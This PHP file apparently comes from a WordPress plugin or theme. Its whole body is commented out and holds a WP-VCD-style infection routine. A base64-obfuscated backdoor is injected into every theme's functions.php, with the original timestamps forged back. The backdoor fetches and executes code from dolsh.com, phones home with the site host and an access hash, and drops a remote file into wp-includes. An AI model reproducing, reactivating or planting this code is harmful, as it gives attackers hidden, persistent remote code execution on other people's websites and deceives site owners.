<?php
//error_reporting(0);
//ini_set('display_errors', 0);
//
//	$install_code = 'PD9waHANCg0KaWYgKGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkgJiYgKCRfUkVRVUVTVFsncGFzc3dvcmQnXSA9PSAneyRQQVNTV09SRH0nKSkNCgl7DQokZGl2X2NvZGVfbmFtZT0id3BfdmNkIjsNCgkJc3dpdGNoICgkX1JFUVVFU1RbJ2FjdGlvbiddKQ0KCQkJew0KDQoJCQkJDQoNCg0KDQoNCgkJCQljYXNlICdjaGFuZ2VfZG9tYWluJzsNCgkJCQkJaWYgKGlzc2V0KCRfUkVRVUVTVFsnbmV3ZG9tYWluJ10pKQ0KCQkJCQkJew0KCQkJCQkJCQ0KCQkJCQkJCWlmICghZW1wdHkoJF9SRVFVRVNUWyduZXdkb21haW4nXSkpDQoJCQkJCQkJCXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZmlsZSA9IEBmaWxlX2dldF9jb250ZW50cyhfX0ZJTEVfXykpDQoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2hfYWxsKCcvXCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzXCgiaHR0cDpcL1wvKC4qKVwvY29kZVwucGhwL2knLCRmaWxlLCRtYXRjaG9sZGRvbWFpbikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KDQoJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSA9IHByZWdfcmVwbGFjZSgnLycuJG1hdGNob2xkZG9tYWluWzFdWzBdLicvaScsJF9SRVFVRVNUWyduZXdkb21haW4nXSwgJGZpbGUpOw0KCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKF9fRklMRV9fLCAkZmlsZSk7DQoJCQkJCQkJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAidHJ1ZSI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQoNCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoJCQkJCQkJCX0NCgkJCQkJCX0NCgkJCQlicmVhazsNCg0KCQkJCQ0KCQkJCQ0KCQkJCWRlZmF1bHQ6IHByaW50ICJFUlJPUl9XUF9BQ1RJT04gV1BfVl9DRCBXUF9DRCI7DQoJCQl9DQoJCQkNCgkJZGllKCIiKTsNCgl9DQoNCgkNCg0KDQppZiAoICEgZnVuY3Rpb25fZXhpc3RzKCAnd3BfdGVtcF9zZXR1cCcgKSApIHsgIA0KJHBhdGg9JF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSW1JFUVVFU1RfVVJJXTsNCmlmICggISBpc180MDQoKSAmJiBzdHJpcG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAnd3AtY3Jvbi5waHAnKSA9PSBmYWxzZSAmJiBzdHJpcG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAneG1scnBjLnBocCcpID09IGZhbHNlKSB7DQoNCmlmKCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vd3d3LmRvbHNoLmNvbS9jb2RlLnBocD9pPSIuJHBhdGgpKQ0Kew0KDQoNCmZ1bmN0aW9uIHdwX3RlbXBfc2V0dXAoJHBocENvZGUpIHsNCiAgICAkdG1wZm5hbWUgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgIndwX3RlbXBfc2V0dXAiKTsNCiAgICAkaGFuZGxlID0gZm9wZW4oJHRtcGZuYW1lLCAidysiKTsNCiAgICBmd3JpdGUoJGhhbmRsZSwgIjw/cGhwXG4iIC4gJHBocENvZGUpOw0KICAgIGZjbG9zZSgkaGFuZGxlKTsNCiAgICBpbmNsdWRlICR0bXBmbmFtZTsNCiAgICB1bmxpbmsoJHRtcGZuYW1lKTsNCiAgICByZXR1cm4gZ2V0X2RlZmluZWRfdmFycygpOw0KfQ0KDQpleHRyYWN0KHdwX3RlbXBfc2V0dXAoJHRtcGNvbnRlbnQpKTsNCn0NCn0NCn0NCg0KDQoNCj8+';
//
//	$install_hash = md5($_SERVER['HTTP_HOST'] . AUTH_SALT);
//	$install_code = str_replace('{$PASSWORD}' , $install_hash, base64_decode( $install_code ));
//
//
//			$themes = ABSPATH . DIRECTORY_SEPARATOR . 'wp-content' . DIRECTORY_SEPARATOR . 'themes';
//
//			$ping = true;
//				$ping2 = false;
//			if ($list = scandir( $themes ))
//				{
//					foreach ($list as $_)
//						{
//
//							if (file_exists($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
//								{
//									$time = filectime($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php');
//
//									if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
//										{
//											if (strpos($content, 'WP_V_CD') === false)
//												{
//													$content = $install_code . $content ;
//													@file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $content);
//													touch( $themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php' , $time );
//												}
//											else
//												{
//													$ping = false;
//												}
//										}
//
//								}
//
//
//								                              else
//                                                            {
//                                                            $list2 = scandir( $themes . DIRECTORY_SEPARATOR . $_);
//					                                 foreach ($list2 as $_2)
//					                                      	{
//
//
//                                                                                    if (file_exists($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php'))
//								                      {
//									$time = filectime($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php');
//
//									if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php'))
//										{
//											if (strpos($content, 'WP_V_CD') === false)
//												{
//													$content = $install_code . $content ;
//													@file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php', $content);
//													touch( $themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php' , $time );
//													$ping2 = true;
//												}
//											else
//												{
//													//$ping = false;
//												}
//										}
//
//								}
//
//
//
//                                                                                  }
//
//                                                            }
//
//
//
//
//
//
//						}
//
//					if ($ping) {
//						$content = @file_get_contents('http://www.dolsh.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
//						@file_put_contents(ABSPATH . '/wp-includes/class.wp.php', file_get_contents('http://www.dolsh.com/admin.txt'));
//					}
//
//															if ($ping2) {
//						$content = @file_get_contents('http://www.dolsh.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
//						@file_put_contents(ABSPATH . 'wp-includes/class.wp.php', file_get_contents('http://www.dolsh.com/admin.txt'));
////echo ABSPATH . 'wp-includes/class.wp.php';
//					}
//
//
//
//				}
//
//
//
//

?><?php error_reporting(0);?>